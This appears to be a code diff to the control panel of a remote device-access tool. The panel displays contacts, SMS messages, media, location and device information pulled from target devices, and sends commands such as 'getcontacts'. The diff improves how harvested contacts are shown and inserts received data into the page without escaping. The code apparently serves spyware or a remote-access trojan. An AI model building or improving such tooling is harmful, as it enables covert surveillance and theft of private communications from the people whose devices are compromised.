@@ -101,7 +101,10 @@
             if(!curMod || !selId || !cache[selId]) return;
             const d = cache[selId], b = document.getElementById('modal-body'), f = document.getElementById('modal-footer');
             const curHash = JSON.stringify(d[curMod] || d.media || d.location || d.info || "");
-            if(hash === curHash) return; hash = curHash;
+            
+            // Bypass hash check for contacts to ensure display
+            if(curMod !== 'contacts' && hash === curHash) return; 
+            hash = curHash;
             b.innerHTML = ""; f.innerHTML = "";
 
             if(curMod === 'info') {
@@ -127,8 +130,10 @@
                 </div>`;
                 f.innerHTML = `<button onclick="cmd('deviceinfo')">REFRESH INFO</button>`;
             } else if(curMod === 'contacts') {
-                b.innerHTML = `<input placeholder="Search contacts..." onkeyup="filterT(this)" style="margin-bottom:10px;">
-                               <table><tr><th>Name</th><th>Number</th></tr>${d.contacts.map(c=>`<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')}</table>`;
+                const contacts = d.contacts || [];
+                b.innerHTML = `<input placeholder="Search ${contacts.length} contacts..." onkeyup="filterT(this)" style="margin-bottom:10px;">
+                               <table><tr><th>Name</th><th>Number</th></tr>${contacts.map(c=>`<tr><td>${c.name}</td><td>${c.number}</td></tr>`).join('')}</table>`;
+                if(contacts.length === 0) b.innerHTML += `<p style="text-align:center; padding:20px; color:var(--dim)">No contacts received yet.</p>`;
                 f.innerHTML = `<button onclick="cmd('getcontacts')">RELOAD CONTACTS</button>`;
             } else if(curMod === 'sms') {
                 b.innerHTML = `<table><tr><th>Sender</th><th>Text</th></tr>${d.sms.map(l=>`<tr><td>${l.userSender}</td><td>${l.content}</td></tr>`).join('')}</table>`;
